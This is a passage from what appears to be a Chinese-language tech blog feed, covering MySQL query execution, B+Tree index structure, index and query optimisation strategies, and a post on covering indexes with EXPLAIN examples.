会使用两次传输排序，即先读取行指针和需要排序的字段在内存中对其排序，然后再根据排序结果去读取数据行，而新版本采用的是单次传输排序，也就是一次读取所有的数据行，然后根据给定的列排序。对于 I/O 密集型应用，效率会高很多） 随着 MySQL 的不断发展，优化器使用的优化策略也在不断的进化，这里仅仅介绍几个非常常用且容易理解的优化策略，其他的优化策略，大家自行查阅吧。 查询执行引擎在完成解析和优化阶段以后，MySQL 会生成对应的执行计划，查询执行引擎根据执行计划给出的指令逐步执行得出结果。整个执行过程的大部分操作均是通过调用存储引擎实现的接口来完成，这些接口被称为handler API。查询过程中的每一张表由一个handler实例表示。实际上，MySQL 在查询优化阶段就为每一张表创建了一个handler实例，优化器可以根据这些实例的接口来获取表的相关信息，包括表的所有列名、索引统计信息等。存储引擎接口提供了非常丰富的功能，但其底层仅有几十个接口，这些接口像搭积木一样完成了一次查询的大部分操作。 返回结果给客户端查询执行的最后一个阶段就是将结果返回给客户端。即使查询不到数据，MySQL 仍然会返回这个查询的相关信息，比如该查询影响到的行数以及执行时间等等。 如果查询缓存被打开且这个查询可以被缓存，MySQL 也会将结果存放到缓存中。 结果集返回客户端是一个增量且逐步返回的过程。有可能 MySQL 在生成第一条结果时，就开始向客户端逐步返回结果集了。这样服务端就无须存储太多结果而消耗过多内存，也可以让客户端第一时间获得返回结果。需要注意的是，结果集中的每一行都会以一个满足 ① 中所描述的通信协议的数据包发送，再通过 TCP 协议进行传输，在传输过程中，可能对 MySQL 的数据包进行缓存然后批量发送。 回头总结一下 MySQL 整个查询执行过程，总的来说分为 5 个步骤： 客户端向 MySQL 服务器发送一条查询请求 服务器首先检查查询缓存，如果命中缓存，则立刻返回存储在缓存中的结果。否则进入下一阶段 服务器进行 SQL 解析、预处理、再由优化器生成对应的执行计划 MySQL 根据执行计划，调用存储引擎的 API 来执行查询 将结果返回给客户端，同时缓存查询结果 性能优化建议看了这么多，你可能会期待给出一些优化手段，是的，下面会从 3 个不同方面给出一些优化建议。但请等等，还有一句忠告要先送给你：不要听信你看到的关于优化的 “绝对真理”，包括本文所讨论的内容，而应该是在实际的业务场景下通过测试来验证你关于执行计划以及响应时间的假设。 Scheme 设计与数据类型优化 选择数据类型只要遵循小而简单的原则就好，越小的数据类型通常会更快，占用更少的磁盘、内存，处理时需要的 CPU 周期也更少。越简单的数据类型在计算时需要更少的 CPU 周期，比如，整型就比字符操作代价低，因而会使用整型来存储 IP 地址，使用DATETIME来存储时间，而不是使用字符串。 这里总结几个可能容易理解错误的技巧： 通常来说把可为NULL的列改为NOT NULL不会对性能提升有多少帮助，只是如果计划在列上创建索引，就应该将该列设置为NOT NULL。 对整数类型指定宽度，比如INT(11)，没有任何卵用。INT使用 32 位（4 个字节）存储空间，那么它的表示范围已经确定，所以INT(1)和INT(20)对于存储和计算是相同的。 UNSIGNED表示不允许负值，大致可以使正数的上限提高一倍。比如TINYINT存储范围是 -128 ~ 127，而UNSIGNED TINYINT存储的范围却是 0 - 255。 通常来讲，没有太大的必要使用DECIMAL数据类型。即使是在需要存储财务数据时，仍然可以使用BIGINT。比如需要精确到万分之一，那么可以将数据乘以一百万然后使用BIGINT存储。这样可以避免浮点数计算不准确和DECIMAL精确计算代价高的问题。 TIMESTAMP使用 4 个字节存储空间，DATETIME使用 8 个字节存储空间。因而，TIMESTAMP只能表示 1970 - 2038 年，比DATETIME表示的范围小得多，而且TIMESTAMP的值因时区不同而不同。 大多数情况下没有使用枚举类型的必要，其中一个缺点是枚举的字符串列表是固定的，添加和删除字符串（枚举选项）必须使用ALTER TABLE（如果只只是在列表末尾追加元素，不需要重建表）。 schema 的列不要太多。原因是存储引擎的 API 工作时需要在服务器层和存储引擎层之间通过行缓冲格式拷贝数据，然后在服务器层将缓冲内容解码成各个列，这个转换过程的代价是非常高的。如果列太多而实际使用的列又很少的话，有可能会导致 CPU 占用过高。 大表ALTER TABLE非常耗时，MySQL 执行大部分修改表结果操作的方法是用新的结构创建一个张空表，从旧表中查出所有的数据插入新表，然后再删除旧表。尤其当内存不足而表又很大，而且还有很大索引的情况下，耗时更久。当然有一些奇技淫巧可以解决这个问题，有兴趣可自行查阅。 创建高性能索引索引是提高 MySQL 查询性能的一个重要途径，但过多的索引可能会导致过高的磁盘使用率以及过高的内存占用，从而影响应用程序的整体性能。应当尽量避免事后才想起添加索引，因为事后可能需要监控大量的 SQL 才能定位到问题所在，而且添加索引的时间肯定是远大于初始添加索引所需要的时间，可见索引的添加也是非常有技术含量的。 接下来将向你展示一系列创建高性能索引的策略，以及每条策略其背后的工作原理。但在此之前，先了解与索引相关的一些算法和数据结构，将有助于更好的理解后文的内容。 索引相关的数据结构和算法 通常我们所说的索引是指B-Tree索引，它是目前关系型数据库中查找数据最为常用和有效的索引，大多数存储引擎都支持这种索引。使用B-Tree这个术语，是因为 MySQL 在CREATE TABLE或其它语句中使用了这个关键字，但实际上不同的存储引擎可能使用不同的数据结构，比如 InnoDB 就是使用的是它的变种B+Tree。 B+Tree中的 B 是指balance，意为平衡。需要注意的是，B + 树索引并不能找到一个给定键值的具体行，它找到的只是被查找数据行所在的页，接着数据库会把页读入到内存，再在内存中进行查找，最后得到要查找的数据。 在介绍B+Tree前，先了解一下二叉查找树，它是一种经典的数据结构，其左子树的值总是小于根的值，右子树的值总是大于根的值，如下图 ①。如果要在这课树中查找值为 5 的记录，其大致流程：先找到根，其值为 6，大于 5，所以查找左子树，找到 3，而 5 大于 3，接着找 3 的右子树，总共找了 3 次。同样的方法，如果查找值为 8 的记录，也需要查找 3 次。所以二叉查找树的平均查找次数为 (3 + 3 + 3 + 2 + 2 + 1) / 6 = 2.3 次，而顺序查找的话，查找值为 2 的记录，仅需要 1 次，但查找值为 8 的记录则需要 6 次，所以顺序查找的平均查找次数为：(1 + 2 + 3 + 4 + 5 + 6) / 6 = 3.3 次，因此大多数情况下二叉查找树的平均查找速度比顺序查找要快。 由于二叉查找树可以任意构造，同样的值，可以构造出如图 ② 的二叉查找树，显然这棵二叉树的查询效率和顺序查找差不多。若想二叉查找数的查询性能最高，需要这棵二叉查找树是平衡的，也即平衡二叉树（AVL 树）。 平衡二叉树首先需要符合二叉查找树的定义，其次必须满足任何节点的两个子树的高度差不能大于 1。显然图 ② 不满足平衡二叉树的定义，而图 ① 是一课平衡二叉树。平衡二叉树的查找性能是比较高的（性能最好的是最优二叉树），查询性能越好，维护的成本就越大。比如图 ① 的平衡二叉树，当用户需要插入一个新的值 9 的节点时，就需要做出如下变动。 通过一次左旋操作就将插入后的树重新变为平衡二叉树是最简单的情况了，实际应用场景中可能需要旋转多次。至此我们可以考虑一个问题，平衡二叉树的查找效率还不错，实现也非常简单，相应的维护成本还能接受，为什么 MySQL 索引不直接使用平衡二叉树？ 随着数据库中数据的增加，索引本身大小随之增加，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘 I/O 消耗，相对于内存存取，I/O 存取的消耗要高几个数量级。可以想象一下一棵几百万节点的二叉树的深度是多少？如果将这么大深度的一颗二叉树放磁盘上，每读取一个节点，需要一次磁盘的 I/O 读取，整个查找的耗时显然是不能够接受的。那么如何减少查找过程中的 I/O 存取次数？ 一种行之有效的解决方法是减少树的深度，将二叉树变为 m 叉树（多路搜索树），而B+Tree就是一种多路搜索树。理解B+Tree时，只需要理解其最重要的两个特征即可：第一，所有的关键字（可以理解为数据）都存储在叶子节点（Leaf Page），非叶子节点（Index Page）并不存储真正的数据，所有记录节点都是按键值大小顺序存放在同一层叶子节点上。其次，所有的叶子节点由指针连接。如下图为高度为 2 的简化了的B+Tree。 怎么理解这两个特征？MySQL 将每个节点的大小设置为一个页的整数倍（原因下文会介绍），也就是在节点空间大小一定的情况下，每个节点可以存储更多的内结点，这样每个结点能索引的范围更大更精确。所有的叶子节点使用指针链接的好处是可以进行区间访问，比如上图中，如果查找大于 20 而小于 30 的记录，只需要找到节点 20，就可以遍历指针依次找到 25、30。如果没有链接指针的话，就无法进行区间查找。这也是 MySQL 使用B+Tree作为索引存储结构的重要原因。 MySQL 为何将节点大小设置为页的整数倍，这就需要理解磁盘的存储原理。磁盘本身存取就比主存慢很多，在加上机械运动损耗（特别是普通的机械硬盘），磁盘的存取速度往往是主存的几百万分之一，为了尽量减少磁盘 I/O，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存，预读的长度一般为页的整数倍。 页是计算机管理存储器的逻辑块，硬件及 OS 往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（许多 OS 中，页的大小通常为 4K）。主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后一起返回，程序继续运行。 MySQL 巧妙利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次 I/O 就可以完全载入。为了达到这个目的，每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上也存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了读取一个节点只需一次 I/O。假设B+Tree的高度为 h，一次检索最多需要h-1次 I/O（根节点常驻内存），复杂度 O(h) = O(logmN)。实际应用场景中，M 通常较大，常常超过 100，因此树的高度一般都比较小，通常不超过 3。 最后简单了解下B+Tree节点的操作，在整体上对索引的维护有一个大概的了解，虽然索引可以大大提高查询效率，但维护索引仍要花费很大的代价，因此合理的创建索引也就尤为重要。 仍以上面的树为例，我们假设每个节点只能存储 4 个内节点。首先要插入第一个节点 28，如下图所示。 接着插入下一个节点 70，在 Index Page 中查询后得知应该插入到 50 - 70 之间的叶子节点，但叶子节点已满，这时候就需要进行也分裂的操作，当前的叶子节点起点为 50，所以根据中间值来拆分叶子节点，如下图所示。 最后插入一个节点 95，这时候 Index Page 和 Leaf Page 都满了，就需要做两次拆分，如下图所示。 Leaf Page 与 Index Page 拆分后最终形成了这样一颗树。 B+Tree为了保持平衡，对于新插入的值需要做大量的拆分页操作，而页的拆分需要 I/O 操作，为了尽可能的减少页的拆分操作，B+Tree也提供了类似于平衡二叉树的旋转功能。当 Leaf Page 已满但其左右兄弟节点没有满的情况下，B+Tree并不急于去做拆分操作，而是将记录移到当前所在页的兄弟节点上。通常情况下，左兄弟会被先检查用来做旋转操作。就比如上面第二个示例，当插入 70 的时候，并不会去做页拆分，而是左旋操作。 通过旋转操作可以最大限度的减少页分裂，从而减少索引维护过程中的磁盘的 I/O 操作，也提高索引维护效率。需要注意的是，删除节点跟插入节点类似，仍然需要旋转和拆分操作，这里就不再说明。 高性能策略通过上文，相信你对B+Tree的数据结构已经有了大致的了解，但 MySQL 中索引是如何组织数据的存储呢？以一个简单的示例来说明，假如有如下数据表：1234567CREATE TABLE People( last_name varchar(50) not null, first_name varchar(50) not null, dob date not null, gender enum(`m`,`f`) not null, key(last_name,first_name,dob)); 对于表中每一行数据，索引中包含了 last_name、first_name、dob 列的值，下图展示了索引是如何组织数据存储的。 可以看到，索引首先根据第一个字段来排列顺序，当名字相同时，则根据第三个字段，即出生日期来排序，正是因为这个原因，才有了索引的 “最左原则”。 MySQL 不会使用索引的情况：非独立的列 “独立的列” 是指索引列不能是表达式的一部分，也不能是函数的参数。比如：1select * from where id + 1 = 5 我们很容易看出其等价于 id = 4，但是 MySQL 无法自动解析这个表达式，使用函数是同样的道理。 前缀索引如果列很长，通常可以索引开始的部分字符，这样可以有效节约索引空间，从而提高索引效率。 多列索引和索引顺序在多数情况下，在多个列上建立独立的索引并不能提高查询性能。理由非常简单，MySQL 不知道选择哪个索引的查询效率更好，所以在老版本，比如 MySQL5.0 之前就会随便选择一个列的索引，而新的版本会采用合并索引的策略。举个简单的例子，在一张电影演员表中，在 actor_id 和 film_id 两个列上都建立了独立的索引，然后有如下查询： 1select film_id,actor_id from film_actor where actor_id = 1 or film_id = 1 老版本的 MySQL 会随机选择一个索引，但新版本做如下的优化：123select film_id,actor_id from film_actor where actor_id = 1union allselect film_id,actor_id from film_actor where film_id = 1 and actor_id 1 当出现多个索引做相交操作时（多个 AND 条件），通常来说一个包含所有相关列的索引要优于多个独立索引。 当出现多个索引做联合操作时（多个 OR 条件），对结果集的合并、排序等操作需要耗费大量的 CPU 和内存资源，特别是当其中的某些索引的选择性不高，需要返回合并大量数据时，查询成本更高。所以这种情况下还不如走全表扫描。 因此explain时如果发现有索引合并（Extra 字段出现Using union），应该好好检查一下查询和表结构是不是已经是最优的，如果查询和表都没有问题，那只能说明索引建的非常糟糕，应当慎重考虑索引是否合适，有可能一个包含所有相关列的多列索引更适合。 前面我们提到过索引如何组织数据存储的，从图中可以看到多列索引时，索引的顺序对于查询是至关重要的，很明显应该把选择性更高的字段放到索引的前面，这样通过第一个字段就可以过滤掉大多数不符合条件的数据。 索引选择性是指不重复的索引值和数据表的总记录数的比值，选择性越高查询效率越高，因为选择性越高的索引可以让 MySQL 在查询时过滤掉更多的行。唯一索引的选择性是 1，这是最好的索引选择性，性能也是最好的。 理解索引选择性的概念后，就不难确定哪个字段的选择性较高了，查一下就知道了，比如：1SELECT * FROM payment where staff_id = 2 and customer_id = 584 是应该创建(staff_id,customer_id)的索引还是应该颠倒一下顺序？执行下面的查询，哪个字段的选择性更接近 1 就把哪个字段索引前面就好。123select count(distinct staff_id)/count(*) as staff_id_selectivity, count(distinct customer_id)/count(*) as customer_id_selectivity, count(*) from payment 多数情况下使用这个原则没有任何问题，但仍然注意你的数据中是否存在一些特殊情况。举个简单的例子，比如要查询某个用户组下有过交易的用户信息：1select user_id from trade where user_group_id = 1 and trade_amount > 0 MySQL 为这个查询选择了索引(user_group_id,trade_amount)，如果不考虑特殊情况，这看起来没有任何问题，但实际情况是这张表的大多数数据都是从老系统中迁移过来的，由于新老系统的数据不兼容，所以就给老系统迁移过来的数据赋予了一个默认的用户组。这种情况下，通过索引扫描的行数跟全表扫描基本没什么区别，索引也就起不到任何作用。 推广开来说，经验法则和推论在多数情况下是有用的，可以指导我们开发和设计，但实际情况往往会更复杂，实际业务场景下的某些特殊情况可能会摧毁你的整个设计。 避免多个范围条件 实际开发中，我们会经常使用多个范围条件，比如想查询某个时间段内登录过的用户：1select user.* from user where login_time > '2017-04-01' and age between 18 and 30; 这个查询有一个问题：它有两个范围条件，login_time 列和 age 列，MySQL 可以使用 login_time 列的索引或者 age 列的索引，但无法同时使用它们。 覆盖索引 如果一个索引包含或者说覆盖所有需要查询的字段的值，那么就没有必要再回表查询，这就称为覆盖索引。覆盖索引是非常有用的工具，可以极大的提高性能，因为查询只需要扫描索引会带来许多好处： 索引条目远小于数据行大小，如果只读取索引，极大减少数据访问量 索引是有按照列值顺序存储的，对于 I/O 密集型的范围查询要比随机从磁盘读取每一行数据的 IO 要少的多 使用索引扫描来排序 MySQL 有两种方式可以生产有序的结果集，其一是对结果集进行排序的操作，其二是按照索引顺序扫描得出的结果自然是有序的。如果 explain 的结果中type列的值为index表示使用了索引扫描来做排序。 扫描索引本身很快，因为只需要从一条索引记录移动到相邻的下一条记录。但如果索引本身不能覆盖所有需要查询的列，那么就不得不每扫描一条索引记录就回表查询一次对应的行。这个读取操作基本上是随机 I/O，因此按照索引顺序读取数据的速度通常要比顺序地全表扫描要慢。 在设计索引时，如果一个索引既能够满足排序，又满足查询，是最好的。 只有当索引的列顺序和ORDER BY子句的顺序完全一致，并且所有列的排序方向也一样时，才能够使用索引来对结果做排序。如果查询需要关联多张表，则只有ORDER BY子句引用的字段全部为第一张表时，才能使用索引做排序。ORDER BY子句和查询的限制是一样的，都要满足最左前缀的要求（有一种情况例外，就是最左的列被指定为常数，下面是一个简单的示例），其他情况下都需要执行排序操作，而无法利用索引排序。12-- 最左列为常数，索引：(date,staff_id,customer_id)select staff_id,customer_id from demo where date = '2015-06-01' order by staff_id,customer_id 冗余和重复索引 冗余索引是指在相同的列上按照相同的顺序创建的相同类型的索引，应当尽量避免这种索引，发现后立即删除。比如有一个索引(A,B)，再创建索引(A)就是冗余索引。冗余索引经常发生在为表添加新索引时，比如有人新建了索引(A,B)，但这个索引不是扩展已有的索引(A)。 大多数情况下都应该尽量扩展已有的索引而不是创建新索引。但有极少情况下出现性能方面的考虑需要冗余索引，比如扩展已有索引而导致其变得过大，从而影响到其他使用该索引的查询。 删除长期未使用的索引 定期删除一些长时间未使用过的索引是一个非常好的习惯。 关于索引这个话题打算就此打住，最后要说一句，索引并不总是最好的工具，只有当索引帮助提高查询速度带来的好处大于其带来的额外工作时，索引才是有效的。对于非常小的表，简单的全表扫描更高效。对于中到大型的表，索引就非常有效。对于超大型的表，建立和维护索引的代价随之增长，这时候其他技术也许更有效，比如分区表。最后的最后，explain后再提测是一种美德。 特定类型查询优化 优化 COUNT() 查询 COUNT()可能是被大家误解最多的函数了，它有两种不同的作用，其一是统计某个列值的数量，其二是统计行数。统计列值时，要求列值是非空的，它不会统计 NULL。如果确认括号中的表达式不可能为空时，实际上就是在统计行数。最简单的就是当使用COUNT(*)时，并不是我们所想象的那样扩展成所有的列，实际上，它会忽略所有的列而直接统计行数。 我们最常见的误解也就在这儿，在括号内指定了一列却希望统计结果是行数，而且还常常误以为前者的性能会更好。但实际并非这样，如果要统计行数，直接使用COUNT(*)，意义清晰，且性能更好。 有时候某些业务场景并不需要完全精确的COUNT值，可以用近似值来代替，EXPLAIN 出来的行数就是一个不错的近似值，而且执行 EXPLAIN 并不需要真正地去执行查询，所以成本非常低。通常来说，执行COUNT()都需要扫描大量的行才能获取到精确的数据，因此很难优化，MySQL 层面还能做得也就只有覆盖索引了。如果不还能解决问题，只有从架构层面解决了，比如添加汇总表，或者使用 redis 这样的外部缓存系统。 优化关联查询 在大数据场景下，表与表之间通过一个冗余字段来关联，要比直接使用JOIN有更好的性能。如果确实需要使用关联查询的情况下，需要特别注意的是： 确保ON和USING字句中的列上有索引。在创建索引的时候就要考虑到关联的顺序。当表 A 和表 B 用列 c 关联的时候，如果优化器关联的顺序是 A、B，那么就不需要在 A 表的对应列上创建索引。没有用到的索引会带来额外的负担，一般来说，除非有其他理由，只需要在关联顺序中的第二张表的相应列上创建索引（具体原因下文分析）。 确保任何的GROUP BY和ORDER BY中的表达式只涉及到一个表中的列，这样 MySQL 才有可能使用索引来优化。 要理解优化关联查询的第一个技巧，就需要理解 MySQL 是如何执行关联查询的。当前 MySQL 关联执行的策略非常简单，它对任何的关联都执行嵌套循环关联操作，即先在一个表中循环取出单条数据，然后在嵌套循环到下一个表中寻找匹配的行，依次下去，直到找到所有表中匹配的行为为止。然后根据各个表匹配的行，返回查询中需要的各个列。 太抽象了？以上面的示例来说明，比如有这样的一个查询：1SELECT A.xx,B.yy FROM A INNER JOIN B USING(c) WHERE A.xx IN (5,6) 假设 MySQL 按照查询中的关联顺序 A、B 来进行关联操作，那么可以用下面的伪代码表示 MySQL 如何完成这个查询：1234567891011outer_iterator = SELECT A.xx,A.c FROM A WHERE A.xx IN (5,6);outer_row = outer_iterator.next;while(outer_row) { inner_iterator = SELECT B.yy FROM B WHERE B.c = outer_row.c; inner_row = inner_iterator.next; while(inner_row) { output[inner_row.yy,outer_row.xx]; inner_row = inner_iterator.next; } outer_row = outer_iterator.next;} 可以看到，最外层的查询是根据A.xx列来查询的，A.c上如果有索引的话，整个关联查询也不会使用。再看内层的查询，很明显B.c上如果有索引的话，能够加速查询，因此只需要在关联顺序中的第二张表的相应列上创建索引即可。 优化 LIMIT 分页 当需要分页操作时，通常会使用LIMIT加上偏移量的办法实现，同时加上合适的ORDER BY字句。如果有对应的索引，通常效率会不错，否则，MySQL 需要做大量的文件排序操作。 一个常见的问题是当偏移量非常大的时候，比如：LIMIT 10000 20这样的查询，MySQL 需要查询 10020 条记录然后只返回 20 条记录，前面的 10000 条都将被抛弃，这样的代价非常高。 优化这种查询一个最简单的办法就是尽可能的使用覆盖索引扫描，而不是查询所有的列。然后根据需要做一次关联查询再返回所有的列。对于偏移量很大时，这样做的效率会提升非常大。考虑下面的查询：1SELECT film_id,description FROM film ORDER BY title LIMIT 50,5; 如果这张表非常大，那么这个查询最好改成下面的样子：1234SELECT film.film_id,film.descriptionFROM film INNER JOIN ( SELECT film_id FROM film ORDER BY title LIMIT 50,5) AS tmp USING(film_id); 这里的延迟关联将大大提升查询效率，让 MySQL 扫描尽可能少的页面，获取需要访问的记录后在根据关联列回原表查询所需要的列。 有时候如果可以使用书签记录上次取数据的位置，那么下次就可以直接从该书签记录的位置开始扫描，这样就可以避免使用OFFSET，比如下面的查询：123SELECT id FROM t LIMIT 10000, 10;-- 改为：SELECT id FROM t WHERE id > 10000 LIMIT 10; 其他优化的办法还包括使用预先计算的汇总表，或者关联到一个冗余表，冗余表中只包含主键列和需要做排序的列。 优化 UNIONMySQL 处理UNION的策略是先创建临时表，然后再把各个查询结果插入到临时表中，最后再来做查询。因此很多优化策略在UNION查询中都没有办法很好的时候。经常需要手动将WHERE、LIMIT、ORDER BY等字句 “下推” 到各个子查询中，以便优化器可以充分利用这些条件先优化。 除非确实需要服务器去重，否则就一定要使用UNION ALL，如果没有ALL关键字，MySQL 会给临时表加上DISTINCT选项，这会导致整个临时表的数据做唯一性检查，这样做的代价非常高。当然即使使用 ALL 关键字，MySQL 总是将结果放入临时表，然后再读出，再返回给客户端。虽然很多时候没有这个必要，比如有时候可以直接把每个子查询的结果返回给客户端。 结语理解查询是如何执行以及时间都消耗在哪些地方，再加上一些优化过程的知识，可以帮助大家更好的理解 MySQL，理解常见优化技巧背后的原理。希望本文中的原理、示例能够帮助大家更好的将理论和实践联系起来，更多的将理论知识运用到实践中。 其他也没啥说的了，给大家留两个思考题吧，可以在脑袋里想想答案，这也是大家经常挂在嘴边的，但很少有人会思考为什么？ 有非常多的程序员在分享时都会抛出这样一个观点：尽可能不要使用存储过程，存储过程非常不容易维护，也会增加使用成本，应该把业务逻辑放到客户端。既然客户端都能干这些事，那为什么还要存储过程？ JOIN本身也挺方便的，直接查询就好了，为什么还需要视图呢？ 参考资料 由 B-/B+树看 MySQL索引结构 MySQL 技术内幕：InnoDB 存储引擎(第 2 版) 高性能 MySQL(第 3 版) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 优化之 Covering Index]]></title>
    <url>%2F2019%2F03%2F29%2FCoveringIndex%2F</url>
    <content type="text"><![CDATA[为什么我老爸不是李嘉诚，为什么我长的这么帅，但是要掉头发呢，你们长这么丑，却不掉头发呢？ 前言在网上随便搜搜，就能找到大把的关于 MySQL 优化的文章，不过里面很多都不准确，说个常见的：1SELECT a FROM ... WHERE b = ... 一般来说，很多文章会告诫你类似这样的查询，不要在 “a” 字段上建立索引，而应该在 “b” 上建立索引。这样做确实不错，但是很多时候这并不是最佳结果。为什么这样说？这还得先从索引来说起。 索引MySQL 官方对索引的定义为：索引（Index）是帮助 MySQL 高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。 在 MySQL 中，索引属于存储引擎级别的概念，不同存储引擎对索引的实现方式是不同的，本文讨论的主要是 InnoDB 的 B+Tree 索引，它又可以分为两类： 聚簇索引 非聚簇索引 聚簇索引又称为聚集索引或主键索引，它并不是一种单独的索引类型，而是一种数据存储方式。在 InnoDB 中，表数据文件本身就是按 B+Tree 组织的一个索引结构，这棵树的叶子节点称为 leaf page，其 data 域保存了完整的数据记录。也即我们所说的数据行即索引，索引即数据。 非聚簇索引是相对于聚簇索引来说的，我们又称为辅助索引或二级索引。 InnoDB 的二级索引 data 域存储的是相应记录主键的值而不是物理位置的指针。 回表了解了 InnoDB 索引的实现方式，我们就很容易理解 “回表” 这个概念了。 聚簇索引这种实现方式使得按主键的搜索十分高效，但是二级索引搜索需要检索两遍索引：首先检索二级索引获得主键，然后用主键到主索引中检索获得记录。 让我们回到开头说的那个例子：1SELECT a FROM ... WHERE b = ... 我们先来分析一下查询的处理过程：在执行查询时，系统会查询 “b” 索引进行定位，然后回表查询需要的数据 “a”，也就是说，在这个过程中存在两次查询，一次是查询索引，另一次是查询表。 那有没有办法用一次查询搞定问题呢？有，就是 Covering Index！ 说到这里你可能会想起来 MySQL5.6 中引入的 MRR（Multi-Range Read，多范围读），它是专门来优化二级索引的范围扫描并且需要回表的情况。它的原理是，将多个需要回表的二级索引根据主键进行排序，然后一起回表，将原来的回表时进行的随机 IO，转变成顺序 IO。MRR 的优势是将多个随机 IO 转换成较少数量的顺序 IO，所以对于 SSD 来说价值还是有的，但是相比机械磁盘来说意义小一些。 Covering Index所谓 Covering Index，就是说不必查询表文件，单靠查询索引文件即可完成。使用覆盖索引的好处是辅助索引不包含整行记录的所有信息，故其大小要远小于聚集索引，因此可以减少大量的 IO 操作。 具体到上边的例子中就是建立一个复合索引 (b, a)，当查询进行时，通过复合索引的 “b” 部分去定位，至于需要的数据 “a”，立刻就可以在索引里得到，从而省略了表查询的过程。 如果你想利用 Covering Index，那么就要注意 SELECT 方式，只 SELECT 必要的字段，千万别SELECT * FROM …，因为我们不太可能把所有的字段一起做索引，虽然可以那样做，但那样会让索引文件过大，结果反倒会弄巧成拙。 如何才能确认查询使用了 Covering Index 呢？很简单，使用 EXPLAIN 即可！只要在 Extra 里出现Using index就说明使用的是 Covering Index。 这里再举两个栗子，让大家印象深点。 例子一 在文章系统里统计总数的时候，一般的查询是这样的：1SELECT COUNT(*) FROM article WHERE category_id = ... 当我们在category_id建立索引后，这个查询使用的就是 Covering Index。 参考文档：COUNT(*) vs COUNT(col) 例子二在文章系统里分页显示的时候，一般的查询是这样的：1SELECT id, title, content FROM article ORDER BY created DESC LIMIT 10000, 10; 通常这样的查询会把索引建在created字段（其中id是主键），不过当LIMIT偏移很大时，查询效率仍然很低，这时这个查询最好改成下面的样子：1234SELECT id, title, content FROM articleINNER JOIN ( SELECT id FROM article ORDER BY created DESC LIMIT 10000, 10) AS page USING(id); 此时，就可以在子查询里利用上 Covering Index，快速定位 id，查询效率嗷嗷的。 基于我的测试数据，这两条语句的查询耗时分别是 “0.08 秒” 和“0.01 秒以内”，8 倍的差距啊！不由又想起了地精的经典语录时间就是金钱，我的朋友！ 补充：InnoDB 引擎层是会对二级索引做自动扩展，优化器能识别出扩展的主键。详情可以参考这篇文章。 我们再来看看这两条语句分别对应的执行计划1234567891011121314151617mysql> EXPLAIN SELECT SQL_NO_CACHE id, title, content FROM article ORDER BY created DESC LIMIT 10000, 10;+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+| 1 | SIMPLE | article | NULL | ALL | NULL | NULL | NULL | NULL | 99210 | 100.00 | Using filesort |+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+1 row in set, 2 warnings (0.00 sec)mysql> EXPLAIN SELECT SQL_NO_CACHE id, title, content FROM article INNER JOIN ( SELECT id FROM article ORDER BY created DESC LIMIT 10000, 10 ) AS page USING(id);+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+| 1 | PRIMARY | | NULL | ALL | NULL | NULL | NULL | NULL | 10010 | 100.00 | NULL || 1 | PRIMARY | article | NULL | eq_ref | PRIMARY | PRIMARY | 4 | page.id | 1 | 100.00 | NULL || 2 | DERIVED | article | NULL | index | NULL | idx_created | 5 | NULL | 10010 | 100.00 | Backward index scan; Using index |+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+3 rows in set, 2 warnings (0.00 sec) 通过 EXPLAIN 我们可以很明显的看出，第一个查询没有用到索引，Extra 里是 “Using filesort”，这是我们应该尽量避免的情况。而第二个的 Extra 是 “Using index”，所以这两者间效率上的差距就显而易见了。 总结Covering Index 并不是什么很难的概念，但是有些人还不了解它或忽视它的价值，希望本文能给你提个醒。 参考 MySQL 覆盖索引 MySQL 索引背后的数据结构及算法原理 MySQL 认识索引 谈谈 SQL 查询中回表对性能的影响 MySQL 优化之 MRR (Multi-Range Read: 二级索引合并回表) 关于 MySQL InnoDB 表的二级索引是否加入主键列的问题解释 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsync 命令详解]]></title>
    <url>%2F2019%2F03%2F29%2Frsync%2F</url>
